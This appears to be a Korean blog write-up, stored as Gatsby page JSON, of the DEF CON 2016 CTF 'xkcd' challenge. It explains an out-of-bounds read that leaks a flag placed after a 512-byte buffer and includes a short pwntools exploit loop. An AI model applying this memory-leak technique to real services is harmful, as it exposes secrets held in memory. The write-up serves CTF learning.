{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/defcon2016_xkcd_ctf_writeup/",
    "result": {"data":{"cur":{"id":"4f92bcc5-6f91-5e27-8ff5-b9b3879be3ae","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlElEQVQI1z3I4Q6CIBRAYV8ES0i5iAKyZXpVxHSzzPUGvf9rNHJrOz++nWheP8N9R783buv8juOrddutf7TuqazLNea6EyVK0wcoFApL66BohMYIx7ebl8kvy7ziONmmU7aG0ghV8ULTTCQZJCkkAeIcAGH+TqSsr66tlrI2RqaCME4oJzQjlMeMxwxOF4gZHDj6zy9QXiFQXvghXAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png\"\n        srcset=\"/static/284023c502fc60db87e32cf7d9b3a3b3/e9ff0/0.png 180w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/f21e7/0.png 360w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png 720w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/218a4/0.png 1052w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>기타 정보</p>\n<ul>\n<li>statically linked, 64 bit</li>\n<li>Heartbeat packet</li>\n</ul>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<ul>\n<li>No RELRO</li>\n<li>No Canary found</li>\n<li>NX enabled</li>\n<li>No PIE</li>\n</ul>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">root@e5e68faa5052<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>Zer0Luck<span class=\"token operator\">/</span>challenges<span class=\"token operator\">/</span>xkcd# <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>xkcd \nCould not open the flag<span class=\"token punctuation\">.</span>\n\n<span class=\"token operator\">-></span> 현재 디렉토리에 flag 파일을 생성한 후에 분석을 시도하자</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 468px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 126.11111111111113%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAIAAAC+dZmEAAAACXBIWXMAAAsTAAALEwEAmpwYAAADB0lEQVQ4y4VU2YobSwz1/39OPiHkNTE3kMy120vbvVV1d+27art4bGaIM7kRokCgwzlSSdpstxxj1zRwOEA/6cM0oEX3nWUsSJmEiL87YwCQv3xhm67T3lfOozY5p1py9T4CpFJqjLl+ZDmXWuu3b3Izjv50Mm2rTydPaTQWpPBS2hiLUrGU8pp/f2spN0/pFn79KjcIOWMCQA4hALiUACBJUY0qOecUgzVRiOpctjbfOd+ZKQXvC2MRIdH3K8bi0o8vR3xsyf7Ed0fSduKK9KGf8CohpFofzHdw9D4Og7xePULZmiKd7FXLHF01mxVljioQWCOskbXxmTnGOo76eqWMWUoN40xpRZjoRtcNAU3GA0hrIpTnhlEKSnlrQamKcXa2hBSYpcTSSc7CKil9SjmXkkt+BhMCpZb2XM8d26PD9+u/R9ztlwPSKABo0NSRWc+TGqW24almQiClTGnFOCyLZcxx7qR05fEv7/YW/MIcQtEa1jUOgxtHHVIQVjqXXvMemPLhkFAKzlWM4XoNbRuGAYx5wP5k72DGQIh6PKam8btdHAbPueHcrasWolKalQw+BeXsx7JTqkKEabLDoC8XxiSb6aqVl7IyloXwkKL14Y55lg1QxzH1vZsmf2mBi/inlfhA9rrW7bY0TcY4TpNRKtSa7z0qpfzS8d+ZjYlSBmNuoy94paQsc5WiQPjbShICzoGU2bhAtMRUY2InYjFTRFPldE7l/8C11vZcD2fe9G2HMJrZKphNmgdGDQ+v/OVtpWt5kp3Wtcw4s7UaC1QJpiX3AiD9RTbGXoiyEECLnxanvFkcJo6sdl0Fd+BDCj7d3phjzNFGGyC+naFwaeu5W4/o8qPbt3hsSUctizEhPc0GUUcXsyxmYZZxx3vZU6Ee4PbsCc1okSvTlNmFKqmtj8EEl3P2Lt8aVu61PuY8xfsNE5v9zhHqWJgl0Fi1KTQUabNkEcfqtIbbTf2o5u1Wbj5/XrZb9v0f9fJT73f27s3ONXu725mmMbvds7+86MvFffo0/wfo2pPCnjlxWgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png\"\n        srcset=\"/static/f3572d894a13fd37dbfff522cf8d4e93/e9ff0/1.png 180w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/f21e7/1.png 360w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png 468w\"\n        sizes=\"(max-width: 468px) 100vw, 468px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 파일의 내용을 읽어와 flag 변수에 집어넣는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 606px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQY03WMwY6CMBRF+f+vmaWJOgsZYhCTJkR2IyI0xYqlgAxQ+96rIZrMYjI3Z3PPTa7HWL3byc1GhKFMEp2mXV0/ug5KMR4zfSqaovipbpPWUNddUXxwbqSEsrTXq/U4zy8XluehEKxpztYiETnnjIFxtPhucxBhHIUxv8bL86MQUZYFnEdKpYgOYB61npQa+v4xTYBIADNEjogQ33hV9a11JKWv1H4YTs6513Hfm7adiAAR3T/xVqtkvf5aLD6Xy8D3kzi+x/H9cOi3WxUEtyjSjLUv+ZcnxJsUYnK/7U8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png\"\n        srcset=\"/static/c7e0df71fb22c6468f806646d2a22537/e9ff0/2.png 180w,\n/static/c7e0df71fb22c6468f806646d2a22537/f21e7/2.png 360w,\n/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png 606w\"\n        sizes=\"(max-width: 606px) 100vw, 606px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">flag 전역 변수</code></pre></div>\n<ul>\n<li>flag 변수는 .bss 섹션에 존재하며 전역 변수로 확인된다.</li>\n<li>사용자의 입력 값을 토대로 특정 조건을 수행하게 되는데 <code class=\"language-text\">strtok</code> 함수를 바탕으로 문자 단위로 짤라 해당 문자열이 포함되는 지를 확인하고 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">SERVER<span class=\"token punctuation\">,</span> ARE YOU STILL THERE<span class=\"token operator\">?</span>\n\nIF SO<span class=\"token punctuation\">,</span> REPLY \"</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 296px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY03WPTWvCQBiE/f8/RPAgouDJY6ARNqmxFsMeFDWhfsRkk+y7m+1+vWUplPbQYY7zzDCj40Hu95Cm3XbLdzueJIIQuV7zKHpkWff23r5sivj1I8vaPIcfUwpp2o8Q0XmvFEppOTenk7lczPlsKL0/n9JZZ1AYq7p2wL8SwgVYa8e5b1tT1/J2Y9drNQyfVaXKUve9Du02pK313zbGe4+MmQB774VAzh2ALUssCqTUMmabRiml8R+F5eNB5jkslzAei/kcFot6MumnU5jNIIoYITyOuySB1epBSEOp+P35C3BhExF8GT7yAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png\"\n        srcset=\"/static/6bb772078781b14a91141d3726fe538e/e9ff0/3.png 180w,\n/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png 296w\"\n        sizes=\"(max-width: 296px) 100vw, 296px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"strtok\" style=\"position:relative;\"><a href=\"#strtok\" aria-label=\"strtok permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strtok</h2>\n<ul>\n<li>그후 해당 부분에서 <code class=\"language-text\">\"</code> 까지 잘라 해당 문자열의 값을 <code class=\"language-text\">globals</code> 전역 변수에 memcpy를 하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAdklEQVQI1xXCWw6CMBAFUPa/B92FayB+EPiAKIkBNUErD1PKTTN12hnDycny/FuWtqps2/rr5fR4Hub5aMx5GAggwAI/IDoXx3G/LHGaGJCicFld37vu1ve9MR/nXkRvVQ0hAYFZmDUlERFmWde990KUVLVptj/N+27Tu6wEfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png\"\n        srcset=\"/static/2ce07033ee502d0147643f29bd5e3fa5/e9ff0/4.png 180w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/f21e7/4.png 360w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png 597w\"\n        sizes=\"(max-width: 597px) 100vw, 597px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"globals-전역-변수\" style=\"position:relative;\"><a href=\"#globals-%EC%A0%84%EC%97%AD-%EB%B3%80%EC%88%98\" aria-label=\"globals 전역 변수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>globals 전역 변수</h2>\n<ul>\n<li><code class=\"language-text\">globals</code> 전역 변수는 총 512바이트이며, 같은 .bss 영역이므로 앞에서 선언된 flag와는 0x200차이가 나는 것을 확인할 수있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 616px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwElEQVQI102LMXLCMBBFff8bpM8NcgNXoXAKm86BEYMRtsGSDJJ2tLvWMhpS5M+b37z/q7oe2/a+35vj8a7U1+Xyebt9nE6/Wm/LMizL2YfNe3aOjWFrC8aw9zyOqdrtVN+fD4frNJkYO8RBRAASEsm/AMi6SoxCJG/jPVVd12j9o3Vr7RCC5FyEtTBap2cHEYk2kXJI6e+JWDaPB1VNUytVK/U9Tb1zgMjM+flMIRAAE+U365rnuXSMOYTMnK3FF9mX4R6RuuOwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png\"\n        srcset=\"/static/a66fd776c64ddf1016048ee1ef70b624/e9ff0/5.png 180w,\n/static/a66fd776c64ddf1016048ee1ef70b624/f21e7/5.png 360w,\n/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png 616w\"\n        sizes=\"(max-width: 616px) 100vw, 616px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>0x200 바이트 차이</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6UlEQVQY03WOTYuDMBCG/f+/p/S41I9sj0tPBQ8tVYvGRJOYGM3ExGIFcZftw8sc3pkHJjgcouMRpWnZdY5ze7t1WaZ+LtXl+sREsxba1jAGnNstjFkpp/tdBwhdz+eUUjG/YWyQ0hSFaJjWGpybAIxz07zD+2U2DQRx/BXHYVVVa0tIL4TJixE3g7F2L2xxbmkIWeQIoe+6JusRxorzsciHR0k73b81P/9mLSiFIEmiJEEY43VR14qQIc+VkKD1/C9/5GSTCekZH/NMlk8lxGitBYCPchie9jKlPalNSUWjWgPgvXef334B15WMo4wkAEoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png\"\n        srcset=\"/static/cd58e795091c689ea83dab4ecabbf93a/e9ff0/6.png 180w,\n/static/cd58e795091c689ea83dab4ecabbf93a/f21e7/6.png 360w,\n/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png 720w,\n/static/cd58e795091c689ea83dab4ecabbf93a/0955e/6.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"비교\" style=\"position:relative;\"><a href=\"#%EB%B9%84%EA%B5%90\" aria-label=\"비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>비교</h2>\n<ul>\n<li>strtok <code class=\"language-text\">(</code> <code class=\"language-text\">)</code> 한 내부의 특 정 정수 값을 바탕으로 <code class=\"language-text\">__isoc99_sscanf</code> 함수의 인자로 쓰이는 것을 확인할 수 있다.</li>\n<li>입력 받은후 <code class=\"language-text\">globals</code> 전역 변수의 길이 값과 <code class=\"language-text\">()</code> 내부에있는 값을 비교하여  <code class=\"language-text\">globals</code> 의 길이가 작을 경우 <code class=\"language-text\">()</code> 입력한 길이 만큼 출력을 한다.</li>\n<li>만약 더 큰 값을 입력했다면 <code class=\"language-text\">Nice Try</code>를 출력한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 463px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQY0zXN7U7CMBQA0L2JmIFssK7tXXt717IBlX2wScBINNEoGuZHou//28TE/yc5Qb392d99b3cf3f6zP3y1N++rzXPVnZt+aPrhujr55tU3p7obqvZtVb20/RlwX/pHck9B3T2Ufg0md2tPRamtQ7eQSOu61tap3Krcabso/UaiEdpkhsIovryajCMIfH2vyM0FSrRcUaqIK4oYmMWKAc6FZoApmIyKaSKo8IlEoW0YzS7GEByOA1oXMVBUSLRC51LbmKu89FwRA+QZ8YzQLeMUqPDpXxBGs9FEBrfHc9XtfN2nGf1rE6eAtkyEnvGMSWSAYNw0Edou50KxzIRRPJrAL24URLi3b+FYAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png\"\n        srcset=\"/static/b3fb4fb36506bf325dc0575af09e8cee/e9ff0/7.png 180w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/f21e7/7.png 360w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png 463w\"\n        sizes=\"(max-width: 463px) 100vw, 463px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<ul>\n<li>어떻게 해당 flag 문자열 값을 읽어올 수 있을까?</li>\n<li><code class=\"language-text\">globals</code>, <code class=\"language-text\">flag</code> 전역 변수는 같은 .bss 섹션에 존재하며 <code class=\"language-text\">globals</code> 변수를 기준으로 0x200 바이트 차이가 난다.</li>\n<li>만약에 사용자가 0x200 바이트 이상의 값을 입력하게 된다면 해당 값은 <code class=\"language-text\">flag</code> 전역 변수와 붙게 될 것이고 널값이 존재 하지 않게되 <code class=\"language-text\">streln</code> 은 해당 길이 검사를 할때 널 값을 확인할 수 없어 <code class=\"language-text\">flag</code> 변수의 널 까지 읽게 되어 <code class=\"language-text\">globals+flag</code> 길이를 측적하게 될 것이다.</li>\n<li>그렇게 되면 <code class=\"language-text\">out-of-bound read</code> 취약점이 발생할 것이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d)'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">512</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>    \n    <span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 708px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: 